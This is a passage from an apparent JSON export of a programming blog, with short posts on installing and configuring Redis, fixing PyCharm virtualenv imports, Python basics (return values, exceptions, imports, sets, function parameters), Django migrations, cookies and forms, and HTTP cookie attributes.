-https://cyc2018.github.io/CS-Notes/#/notes/Redis?id=%e5%85%ad%e3%80%81%e9%94%ae%e7%9a%84%e8%bf%87%e6%9c%9f%e6%97%b6%e9%97%b4","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Redis】安装 Redis","date":"2019-10-27T12:38:03.000Z","path":"2019/10/27/【Redis】安装-Redis/","text":"macOS 安装Installation - 方法 1（手工编译）Download, extract and compile Redis with: 1234$ wget http://download.redis.io/releases/redis-5.0.5.tar.gz$ tar xzf redis-5.0.5.tar.gz$ cd redis-5.0.5$ make The binaries that are now compiled are available in the src directory. Run Redis with: 1$ src/redis-server You can interact with Redis using the built-in client: 12345$ src/redis-cliredis&gt; set foo barOKredis&gt; get foo\"bar\" Installation - 方法 2（使用 brew）1$ brew install redis 后台运行 redis 服务1$ brew services start redis 前台运行 Redis 服务1$ redis-server 可以直接运行 redis-server 以启动 Redis 服务（在服务端中输入 quit 可以退出）。然后另外开一个终端，运行 redis-cli 以启动一个客户端。 指定配置文件路径并前台运行 Redis 服务： 1$ redis-server /usr/local/etc/redis.conf 配置为在后台运行 Redis将配置文件redis.conf中的deamonize yes 以守护进程的方式启动。 在目录 /usr/local/redis-3.2.8 下： 1vim redis.conf 有一行是 1daemonize no 这是守护进程的开关，改为 yes 1deamonize yes 在bin下可执行的程序 redis-server: Redis服务器 redis-cli: 命令行客户端 redis-benchmark: Redis的性能测试工具 redis-check-aof: AOF文件修复工具 redis-check-dump: RDB文件检测工具 redis.conf: Redis的配置文件 Ubuntu安装12$ sudo apt-get update$ sudo apt-get install redis-server redis配置 修改redis.conf。该文件路径默认安装地址为：/etc/redis/redis.conf 允许远程访问1$ sudo vim /etc/redis/redis.conf 注释掉 bind 127.0.0.1 ::1。 重启 Redis 服务： 1$ service redis restart 在另一台主机上连接Redis 12$ redis-cli -h 192.168.2.204192.168.2.204:6379&gt;","comments":true,"categories":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/categories/Redis/"}],"tags":[{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Python】PyCharm 中的 import 问题","date":"2019-10-27T12:19:50.000Z","path":"2019/10/27/【Python】PyCharm-中的-import-问题/","text":"Problem已经在 Terminal 下执行： 1$ pip install django-redis 在项目中引用from django_redis import get_redis_connection。 但是在 PyCharm 中运行 Django，提示依赖包未安装错误： 1ImportError: No module named redis_cache 但是，在 Termical 下执行： 1$ python manage.py runserver 可以正常运行 Django。 Analysis由于在默认情况下，通过 PyCharm 创建的项目会使用virtualenv来管理项目中使用到的依赖包。因此，如果直接在 Terminal 下执行： 12345$ pip install django-redisRequirement already satisfied: django-redis in /Library/Python/2.7/site-packages (4.10.0)Requirement already satisfied: redis&gt;=2.10.0 in /Library/Python/2.7/site-packages (from django-redis) (3.3.11)Requirement already satisfied: Django&gt;=1.11 in /Library/Python/2.7/site-packages (from django-redis) (1.11.24)Requirement already satisfied: pytz in /System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python (from Django&gt;=1.11-&gt;django-redis) (2013.7) 其实会将django-redis安装到系统全局的 site-packages的文件夹下。 而通过： 123456789$ pip listPackage Version------------ -------Django 1.11.25pip 19.2.3PyMySQL 0.9.3pytz 2019.2setuptools 41.2.0wheel 0.33.6 我们发现在这个项目的 venv环境中并没有安装django-redis，这也解释了为什么直接在 Termical 下运行这个 Django没有依赖包找不到的问题，而通过 PyCharm 就有。 Solution进到项目对应的文件夹下，执行： 1$ source venv/bin/activate 在 venv 下安装这个依赖库： 1$ pip install django-redis 此时，就可以在 PyCharm 下运行你的工程了。","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Basics - 函数返回值","date":"2019-10-27T12:11:04.000Z","path":"2019/10/27/【Python】Basics-函数返回值/","text":"IntroductionIn Python, you can return multiple values by simply return them separated by commas. As an example, define a function that returns a string and a number as follows: Just write each value after the return, separated by commas. 12def test(): return 'abc', 100 Return Multiple ValuesIn Python, comma-separated values are considered tuples without parentheses, except where required by syntax. For this reason, the function in the above example returns a tuple with each value as an element. The return value is tuple. 123456result = test()print(result)print(type(result))# ('abc', 100)# &lt;class 'tuple'&gt; Each element has a type defined in the function. 123456789print(result[0])print(type(result[0]))# abc# &lt;class 'str'&gt;print(result[1])print(type(result[1]))# 100# &lt;class 'int'&gt; Same for 3 or more return values. 12345678910111213def test2(): return 'abc', 100, [0, 1, 2]a, b, c = test2()print(a)# abcprint(b)# 100print(c)# [0, 1, 2] Return listUsing [] returns list instead of tuple. 123456789def test_list(): return ['abc', 100]result = test_list()print(result)print(type(result))# ['abc', 100]# &lt;class 'list'&gt; Reference https://note.nkmk.me/en/python-function-return-multiple-values/","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Exception","date":"2019-10-20T13:33:05.000Z","path":"2019/10/20/【Python】Exception/","text":"try-except1234try: raise FError(\"自定义异常\")except FError as e: print(e) 自定义异常123456class ObjectNotExistInDBError(Exception): def __init__(self,msg): super(ObjectNotExistInDBError,self).__init__(self) self.msg=msg def __str__(self): return self.msg 抛出异常主动抛出异常： 1raise RuntimeError('testError')","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Django】Error - Django : Table doesn't exist","date":"2019-10-20T13:12:35.000Z","path":"2019/10/20/【Django】Error-Django-Table-doesn-t-exist/","text":"ProblemI dropped some table related to an app. and again tried this command 1$ python manage.py syncdb It shows error like 1django.db.utils.ProgrammingError: (1146, &quot;Table &apos;someapp.feed&apos; doesn&apos;t exist&quot;) Solution drop tables comment-out the model in model.py, if django version &gt;= 1.7: 12$ python manage.py makemigrations$ python manage.py migrate --fake ​ else 12$ python manage.py schemamigration someapp --auto$ python manage.py migrate someapp --fake comment-in your model in models.py if django version &gt;= 1.7: 12$ python manage.py makemigrations$ python manage.py migrate ​ else 12$ python manage.py schemamigration someapp --auto$ python manage.py migrate someapp Reference Django : Table doesn’t exist - https://stackoverflow.com/questions/27583744/django-table-doesnt-exis","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【Python】import","date":"2019-10-20T13:04:50.000Z","path":"2019/10/20/【Python】import/","text":"模块（Module）和包（Package）为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。在Python中，一个.py文件就称之为一个模块（Module）。 使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。 如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python又引入了按目录来组织模块的方法，称为包（Package）。 举个例子，一个abc.py的文件就是一个名字叫abc的模块，一个xyz.py的文件就是一个名字叫xyz的模块。 现在，假设我们的abc和xyz这两个模块名字与其他模块冲突了，于是我们可以通过包来组织模块，避免冲突。方法是选择一个顶层包名，比如mycompany，按照如下目录存放： 1234mycompany├─ __init__.py├─ abc.py└─ xyz.py 引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，abc.py模块的名字就变成了mycompany.abc，类似的，xyz.py的模块名变成了mycompany.xyz。 请注意，每一个包目录下面都会有一个__init__.py的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包。__init__.py可以是空文件，也可以有Python代码，因为__init__.py本身就是一个模块，而它的模块名就是mycompany。 类似的，可以有多级目录，组成多级层次的包结构。比如如下的目录结构： 12345678mycompany ├─ web │ ├─ __init__.py │ ├─ utils.py │ └─ www.py ├─ __init__.py ├─ abc.py └─ utils.py 文件www.py的模块名就是mycompany.web.www，两个文件utils.py的模块名分别是mycompany.utils和mycompany.web.utils。 自己创建模块时要注意命名，不能和Python自带的模块名称冲突。例如，系统自带了sys模块，自己的模块就不可命名为sys.py，否则将无法导入系统自带的sys模块。 Absolute Import1from src.packone import test1 绝对引用通过package的绝对路径引入module，且路径要从最上一层的package写起。 from xxx import *123456# constants.pyMAX_ENTITY_NUMBER_LIMIT_FOR_DB_QUERY = 500DEFAULT_ENTITY_NUMBER_FOR_DB_QUERY = 50def a(): pass 如果通过from core.constants import *，则core.constants（对应constants.py文件）中定义的所有变量和函数，都可以在 views.py 中直接使用（无需通过 constants.MAX_ENTITY_NUMBER_LIMIT_FOR_DB_QUERY 来调用，就好像把constants.py文件全文复制到了views.py 中） 1234567891011#views.pyfrom core.constants import *def get_limit(l): a() if l is None: l = DEFAULT_ENTITY_NUMBER_FOR_DB_QUERY else: if l &gt; MAX_ENTITY_NUMBER_LIMIT_FOR_DB_QUERY: l = DEFAULT_ENTITY_NUMBER_FOR_DB_QUERY return l import xxxNote：datetime模块中有一个 datetime 方法。 1234567&gt;&gt;&gt; import datetime&gt;&gt;&gt; datetime(2017,10,30)Traceback (most recent call last): File \"&lt;stdin&gt;\", line 1, in &lt;module&gt;TypeError: 'module' object is not callable&gt;&gt;&gt; datetime.datetime(2017,10,30)datetime.datetime(2017, 10, 30, 0, 0) 结论：通过 import 语句引用一个模块后，要通过[模块名].[方法名]()来调用。 from [模块名] import xxx123&gt;&gt;&gt; from datetime import datetime&gt;&gt;&gt; datetime(2017,10,30)datetime.datetime(2017, 10, 30, 0, 0) 结论：通过 from xxx import xxx 语句引用一个模块后，直接可以调用这个模块的方法，即通过 [方法名]()，而方法名前不再需要声明该方法所属的模块。 Relative Import1234from . import yyyfrom .xx import yyyfrom ..xx import yyyfrom ...xx import yyy 相对引入方式使用一个点号来标识引入类库的精确位置。与linux的相对路径表示相似，一个点表示当前目录，每多一个点号则代表向上一层目录。 文件在文件夹中1234567$ tree.├── core│ └── models.py└── manage.py1 directory, 2 files 123&gt;&gt;&gt; from .core import models&gt;&gt;&gt; models.Channel.objects.all()&lt;QuerySet [&lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;, &lt;Channel: Channel object&gt;]&gt; 类似的，这里也是通过 from xxx import xxx 语句引用一个模块，所以可以直接调用 models 模块的方法，即通过 [方法名]()，而方法名前不再需要声明该方法所属的模块。 Reference https://www.jianshu.com/p/04bac02ae3f0","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Django】Django 读写 Cookie","date":"2019-10-20T13:03:37.000Z","path":"2019/10/20/【Django】Django-读写-Cookie/","text":"获取Cookie1234request.COOKIES[key]request.COOKIES.get(key)# 普通cookie是明文传输的，可以直接在客户端直接打开，所以需要加盐，解盐之后才能查看request.get_signed_cookie(key, default=RAISE_ERROR, salt=&apos;&apos;, max_age=None) 参数： default: 默认值 salt: 加密盐 max_age: 后台控制过期时间 设置cookie在对象返回给客户端之前，设置cookie 123response = redirect(&apos;/page/&apos;)response.set_cookie(key, value=&apos;&apos;, max_age=None, expires=None, path=&apos;/&apos;, domain=None, secure=None, httponly=False)response.set_signed_cookie(key,value,salt=&apos;加密盐&apos;,...) 参数： key：键 value=””：值 max_age=None：cookie的生命长度，默认为None，浏览器关闭cookie立即失效 expires=None：cookie过期时间时间点，默认为None，浏览器关闭cookie立即失效 path=’/‘：Cookie生效的路径，/ 表示根路径。根路径的cookie可以被任何url的页面访问 domain=None：默认值为None，设置该 Cookie 的网页所在的域名None secure=False：用来设置 Cookie 只在确保安全的请求中才会发送。当请求是 HTTPS 或者其他安全协议时，包含 secure 选项的 Cookie 才能被保存到浏览器或者发送至服务器。 httponly=False：为True时，只能在HTTP协议中传输，无法通过 JavaScript 获取 Reference https://docs.djangoproject.com/en/2.2/topics/http/sessions/","comments":true,"categories":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/categories/Django/"}],"tags":[{"name":"Django","slug":"Django","permalink":"http://swsmile.info/tags/Django/"}]},{"title":"【HTTP】Cookie","date":"2019-10-20T12:14:01.000Z","path":"2019/10/20/【HTTP】Cookie/","text":"用途因为HTTP协议是无状态的，即服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，所以Cookie就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。 在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。 Cookie另一个典型的应用是当登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，如果该Cookie尚未到期，浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。 总结来说，Cookie主要用于以下三个方面： 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息） 个性化设置（如用户自定义设置、主题等） 浏览器行为跟踪（如跟踪分析用户行为等） 创建Cookie当服务器收到HTTP请求时，服务器可以在响应头里面添加一个Set-Cookie选项。浏览器收到响应后通常会保存下Cookie，之后对该服务器每一次请求中都通过Cookie请求头部将Cookie信息发送给服务器。另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。 服务器使用Set-Cookie响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样： 1Set-Cookie: &lt;cookie名&gt;=&lt;cookie值&gt; Cookie 的类型会话期Cookie会话期Cookie是最简单的Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（Expires）或者有效期（Max-Age）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。 持久性Cookie和关闭浏览器便失效的会话期Cookie不同，持久性Cookie可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; 提示：当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。 参数maxAge表示该Cookie失效的时间，单位秒。 如果为正数，则该Cookie在maxAge秒之后失效。 如果为负数，该Cookie为临时Cookie，关闭浏览器即失效，浏览器也不会以任何形式保存该Cookie。 如果为0，表示删除该Cookie。默认为–1 Secure标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，Secure标记也无法提供确实的安全保障。从 Chrome 52 和 Firefox 52 开始，不安全的站点（http:）无法使用Cookie的 Secure 标记。 HttpOnly为避免跨域脚本 (XSS) 攻击，通过JavaScript的 Document.cookie API无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。 Cookie的作用域Domain 和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。 Domain 标识指定了哪些主机可以接受Cookie。如果不指定，默认为当前文档的主机（不包含子域名）。如果指定了Domain，则一般包含子域名。 例如，如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。 Path 标识指定了主机下的哪些路径可以接受Cookie（该URL路径必须存在于请求URL中）。以字符 %x2F (“/“) 作为路径分隔符，子路径也会被匹配。 例如，设置 Path=/docs，则以下地址都会匹配： /docs /docs/Web/ /docs/Web/HTTP Reference https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies","comments":true,"categories":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/categories/HTTP/"}],"tags":[{"name":"HTTP","slug":"HTTP","permalink":"http://swsmile.info/tags/HTTP/"}]},{"title":"【Python】Collection - set","date":"2019-10-20T12:03:36.000Z","path":"2019/10/20/【Python】Collection-set/","text":"SetPython的set和其他语言类似, 是一个无序不重复元素集, 基本功能包括关系测试和消除重复元素. 集合对象还支持union（联合）， intersection（交），difference（差）和sysmmetric difference（对称差集）等数学运算. 初始化12s = set([3,5,9,10]) #创建一个数值集合t = set(&quot;Hello&quot;) #创建一个唯一字符的集合 基本操作123456789101112131415161718t.add(&apos;x&apos;) # 添加一项s.update([10,37,42]) # 在s中添加多项 # 使用remove()可以删除一项：t.remove(&apos;H&apos;)# set 的长度len(s)# 测试 x 是否是 s 的成员x in s# 测试 x 是否不是 s 的成员x not in s# 测试是否 s 中的每一个元素都在 t 中s.issubset(t)s &lt;= t 运算12345678&gt;&gt;&gt; x &amp; y # 交集set([&apos;a&apos;, &apos;m&apos;]) &gt;&gt;&gt; x | y # 并集set([&apos;a&apos;, &apos;p&apos;, &apos;s&apos;, &apos;h&apos;, &apos;m&apos;]) &gt;&gt;&gt; x - y # 差集set([&apos;p&apos;, &apos;s&apos;]) Reference Python集合（set）类型的操作 - https://blog.csdn.net/business122/article/details/7541486","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Python】Basics - 函数参数","date":"2019-10-20T09:35:53.000Z","path":"2019/10/20/【Python】Basics-函数参数/","text":"定义函数1234567891011&gt;&gt;&gt; def fib(n): # write Fibonacci series up to n... \"\"\"Print a Fibonacci series up to n.\"\"\"... a, b = 0, 1... while a &lt; n:... print(a, end=' ')... a, b = b, a+b... print()...&gt;&gt;&gt; # Now call the function we just defined:... fib(2000)0 1 1 2 3 5 8 13 21 34 55 89 144 233 377 610 987 1597 函数的参数位置问题在通常的情况下，Python 会根据在调用函数时，参数传入的位置顺序为参数变量赋值，比如： 123456def test(a,b,c): print a print b print ctest(1, 2, 3) 这其实默认包含了以下的这次含义：在调用 test()时，传入的第一个值会被赋值给变量 a，传入的第二个值会被赋值给变量 b…。 这种情况普遍存在于各种编程语言中，因此也非常好理解。Python 将这个函数参数的赋值模式称为位置参数（positional argument），即根据相对的位置顺序来为参数赋值。 Python 之所以搞这么麻烦，为这种被广泛应用于各种编程语言的函数参数赋值模式还特意取个名字，是因为 Python 还提供了另外一种函数参数的赋值模式，称为关键字参数（keyword argument），即通过指定参数的名称来为参数列表中的参数赋值。 123test(a=1, b=2, c=3)test(b=2, a=1, c=3)test(c=3, a=1, b=3) 上面三种对于test()的调用，就是基于关键字参数（keyword argument），从调用后都能产生完全相同的副作用（side effect）角度来说，它们是等价的（equivalent）。 你可能会觉得，为什么 Python 要把一个函数参数的传值搞这么麻烦。或者说，目前，我们还没有看到引入关键字参数（keyword argument）有什么好处。我们在介绍完可选的函数参数后就会进行解释。 可选提供的函数参数（为函数参数设置默认值）Common Situation在最一般的情况下，如果我们在调用函数时，没有按照函数的参数列表提供参数，则会报错，比如下面的例子： 123456def test(a,b,c): print a print b print ctest(2) 错误： 1234Traceback (most recent call last): File \"/Users/wei.shi/Desktop/performance/main.py\", line 26, in &lt;module&gt; test(2)TypeError: test() takes exactly 3 arguments (1 given) 说明： test()需要两个参数，而我们只提供了一个参数。 因此，我们需要一种”可选提供特定参数“的机制，或者说，在定义函数的时候，就为某些参数定义好了默认值，如果这些参数没有被调用者提供，则将这些参数用它们的默认值来进行赋值。 函数的可选提供参数的定义1234567891011def ask_ok(prompt, retries=4, reminder='Please try again!'): while True: ok = input(prompt) if ok in ('y', 'ye', 'yes'): return True if ok in ('n', 'no', 'nop', 'nope'): return False retries = retries - 1 if retries &lt; 0: raise ValueError('invalid user response') print(reminder) 这个函数可以通过以下任何一种方式来调用： 仅仅提供必需（mandatory）参数： ask_ok(&#39;Do you really want to quit?&#39;) 提供一个可选参数：ask_ok(&#39;OK to overwrite the file?&#39;, 2) 提供所有的可选参数： ask_ok(&#39;OK to overwrite the file?&#39;, 2, &#39;Come on, only yes or no!&#39;) 注意需要注意的是，在定义包含可选提供参数的函数参数列表时，可选参数必需声明在非可选参数之后，换句话说，在声明了一个可选提供参数之后，接下来就不能再申明一个非可选提供参数了。 以下是一个错误例子： 12def a(a=1, b): pass 执行后会提示： 123 File \".../main.py\", line 13 def a(a=1, b):SyntaxError: non-default argument follows default argument 可选参数 + 关键字参数（keyword argument）有了可选参数之后，我们可以调用test()函数的方式又更多了。 假设 test2()被这样定义： 1234def test2(a, b, c=0): print a print b print c 我们可以这样来调用它： 12345test2(1,2) # positional(a, b) and default(c)test2(1,2,3) # positional(a, b)test2(b=2, a=1) # named(b=2, a=1) and defaulttest2(c=3,b=2,a=1) # named(b=2, a=1, c=3)test2(1,c=3,b=2) # positional(a) and named(b=2,c=3) Keyword Arguments的意义当可选参数不止一个时，我们就能看出Keyword Arguments的意义了。 12345def test3(a, b, c=3, d=4): print a print b print c print d 可以看到，必需提供的参数只有 a 和 b，因此我们可以这样调用： 12test3(1, 2)test3(1, 2, d=1000) 在这个例子中，我们就能看出Keyword Arguments的意义了，即当有多个可选传入的函数参数时，我们不需要像在 Java 中那样通过test3(1, 2, Null, 1000)来调用，而是直接指定d=1000。 试想，当可选参数非常多时，简单的通过d=1000来指定我们想要传的可选参数，这确实能够缩短在编写函数调用时所花的时间。 传入任意数量的参数有时候，在定义函数时，我们并不能提前知道到底需要多少个参数，比如： 12345678910def make_pizza(title, *toppings): \"\"\"Print the list of toppings that have been requested.\"\"\" print(title) print(toppings)make_pizza('myPizza', 'pepperoni') make_pizza('myPizza', 'mushrooms', 'green peppers', 'extra cheese')parameters = ('myPizza', 'mushrooms', 'green peppers', 'extra cheese')make_pizza(*parameters) toppings其实是一个 tuple。 值得注意的是，在每一个函数中，只能有一个参数是传入任意数量的参数。比如这样的定义就会报错： 12def make_pizze(*a, *b): pass 传入任意数量的关键字参数（keyword argument）12345678910111213def build_profile(first, last, **user_info): \"\"\"Build a dictionary containing everything we know about a user.\"\"\" profile = &#123;&#125; profile['first_name'] = first profile['last_name'] = last for key, value in user_info.items(): profile[key] = value return profileuser_profile = build_profile('albert', 'einstein')user_profile = build_profile('albert', 'einstein', location='princeton', field='physics') paras = &#123;location='princeton', field='physics'&#125;user_profile = build_profile('albert', 'einstein', **paras) 可变数量参数 + 关键字参数（keyword argument）12345678def print_params(x, y, z=3, *params, **kw): print(x, y, z) print(params) print(kw)&gt;&gt;&gt;print_params(1, 2, 3, 5, 6, 7, foo=1, bar=2)1 2 3(5, 6, 7)&#123;'foo':1, 'bar':2&#125; 参数组合在Python中定义函数，可以用必选参数（必需提供的参数）、默认参数（可选提供参数）、可变参数、关键字参数和命名关键字参数，这5种参数都可以组合使用。但是请注意，参数声明的顺序必须是：必选参数、默认参数、可变参数、命名关键字参数和关键字参数。 比如定义一个函数，包含上述若干种参数： 12def f1(a, b, c=0, *args, **kw): print('a =', a, 'b =', b, 'c =', c, 'args =', args, 'kw =', kw) 在函数调用的时候，Python解释器自动按照参数位置和参数名把对应的参数传进去。 123456789101112131415161718192021222324252627282930313233343536373839404142&gt;&gt;&gt; f1(1, 2)a = 1 b = 2 c = 0 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1, 2, c=3)a = 1 b = 2 c = 3 args = () kw = &#123;&#125;&gt;&gt;&gt; f1(1, 2, 3, 'a', 'b')a = 1 b = 2 c = 3 args = ('a', 'b') kw = &#123;&#125;# 以 [] 形式提供 args&gt;&gt;&gt; f1(1, 2, 3, *[4, 5])('a =', 1, 'b =', 2, 'c =', 3, 'args =', (4, 5), 'kw =', &#123;&#125;)# 不提供 args&gt;&gt;&gt;f1(1, 2, 3, x=99, y =100)('a =', 1, 'b =', 2, 'c =', 3, 'args =', (), 'kw =', &#123;'y': 100, 'x': 99&#125;)# 这样提供 x=99 时，有可能会出现新的问题，即当你想获得 kw = &#123;\"a\": 99&#125;的结果时，这样的调用方式竟然无法搞定&gt;&gt;&gt; f1(1, 2, 3, 'a', 'b', x=99)a = 1 b = 2 c = 3 args = ('a', 'b') kw = &#123;'x': 99&#125;# 以下情况会报错&gt;&gt;&gt; f1(1, 2, 3, 'a', 'b', a=99)# 错误：TypeError: f1() got multiple values for keyword argument 'a'# 因此，推荐尽量以 **&#123;&#125; 的形式为关键字参数赋值（除非你要提供的参数非常简单）&gt;&gt;&gt; f1(1, 2, 3, 'a', 'b', x=99, y =100)('a =', 1, 'b =', 2, 'c =', 3, 'args =', ('a', 'b'), 'kw =', &#123;'y': 100, 'x': 99&#125;)# 以 **&#123;&#125; 形式提供kw&gt;&gt;&gt; f1(1, 2, 3, 4, 5, **&#123;\"x\": 99, \"y\": 100&#125;)('a =', 1, 'b =', 2, 'c =', 3, 'args =', (4, 5), 'kw =', &#123;'y': 100, 'x': 99&#125;)# 以 [] 形式提供 args，以 **&#123;&#125; 形式提供kw&gt;&gt;&gt; f1(1, 2, 3, *[4, 5], **&#123;\"x\": 6, \"y\": 7&#125;)('a =', 1, 'b =', 2, 'c =', 3, 'args =', (4, 5), 'kw =', &#123;'y': 7, 'x': 6&#125;)# 这样也能执行成功，但是结果很奇怪&gt;&gt;&gt; f1(1, 2, *[4, 5], **&#123;\"x\": 6, \"y\": 7&#125;)('a =', 1, 'b =', 2, 'c =', 4, 'args =', (5,), 'kw =', &#123;'y': 7, 'x': 6&#125;) 可选提供参数 + 任意数量的关键字参数（keyword argument）可选提供参数 + 关键字参数Example 11234567def fun(a=1, b=2, c=3, **filter): print a print b print filterfun(a=3, b=4, c=5, d=6)fun(3, 4, **&#123;\"c\": 5, \"d\": 6&#125;) 输出： 12345634&#123;&apos;c&apos;: 5, &apos;d&apos;: 6&#125;34&#123;&apos;c&apos;: 5, &apos;d&apos;: 6&#125; Example 2123456789def fun(a=1, b=2, c=3, d=4, **filter): print a print b print c print d print filterfun(b=5, c=6, **&#123;\"x\": 7, \"y\": 8&#125;)# fun(b=5, c=6, **&#123;\"a\": 7, \"b\": 8&#125;) 会报错：TypeError: fun() got multiple values for keyword argument 'b' 输出： 1234156&#123;&apos;y&apos;: 8, &apos;x&apos;: 7&#125; Reference Python Crash Course (2nd Edition) : A Hands-On, Project-Based Introduction to Programming Learning Python https://www.liaoxuefeng.com/wiki/1016959663602400/1017261630425888","comments":true,"categories":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/categories/Python/"}],"tags":[{"name":"Python","slug":"Python","permalink":"http://swsmile.info/tags/Python/"}]},{"title":"【Django】Django Form","date":"2019-10-20T08:39:09.000Z","path":"2019/10/20/【Django】Django-Form/","text":"Django’s role in formsDjango’s form functionality can simplify and automate vast portions of this work, and can also do it more securely than most programmers would be able to do in code they wrote themselves. Django handles three distinct parts of the work involved in forms: preparing and restructuring data to make it ready for rendering creating HTML forms for the data receiving and processing submitted forms and data from the client It is possible to write code that does all of this manually, but Django can take care of it all for you. DemoDemo1The viewForm data sent back to a Django website is processed by a view, generally the same view which published the form. This allows us to reuse some of the same logic. To handle the form we need to instantiate it in the view for the URL where we want it to be published: 12345678910111213141516171819202122from django.http import HttpResponseRedirectfrom django.shortcuts import renderfrom .forms import NameFormdef get_name(request): # if this is a POST request we need to process the form data if request.method == 'POST': # create a form instance and populate it with data from the request: form = NameForm(request.POST) # check whether it's valid: if form.is_valid(): # process the data in form.cleaned_data as required # ... # redirect to a new URL: return HttpResponseRedirect('/thanks/') # if a GET (or any other method) we'll create a blank form else: form = NameForm() return render(request, 'name.html', &#123;'form': form&#125;) If we arrive at this view with a GET request, it will create an empty form instance and place it in the template context to be rendered. This is what we can expect to happen the first time we visit the URL. If the form is submitted using a POST request, the view will once again create a form instance and populate it with data from the request: form = NameForm(request.POST) This is called “binding data to the form” (it is now a bound form). We call the form’s is_valid() method; if it’s not True, we go back to the template with the form. This time the form is no longer empty (unbound) so the HTML form will be populated with the data previously submitted, where it can be edited and corrected as required. If is_valid() is True, we’ll now be able to find all the validated form data in its cleaned_data attribute. We can use this data to update the database or do other processing before sending an HTTP redirect to the browser telling it where to go next. The templateWe don’t need to do much in our name.html template. The simplest example is: 12345&lt;form action=\"/your-name/\" method=\"post\"&gt; &#123;% csrf_token %&#125; &#123;&#123; form &#125;&#125; &lt;input type=\"submit\" value=\"Submit\"&gt;&lt;/form&gt; All the form’s fields and their attributes will be unpacked into HTML markup from that by Django’s template language. Demo2forms.py1234567from django import formsclass ContactForm(forms.Form): subject = forms.CharField(max_length=100) message = forms.CharField(widget=forms.Textarea) sender = forms.EmailField() cc_myself = forms.BooleanField(required=False) views.py1234567891011121314from django.core.mail import send_mailif form.is_valid(): subject = form.cleaned_data[&apos;subject&apos;] message = 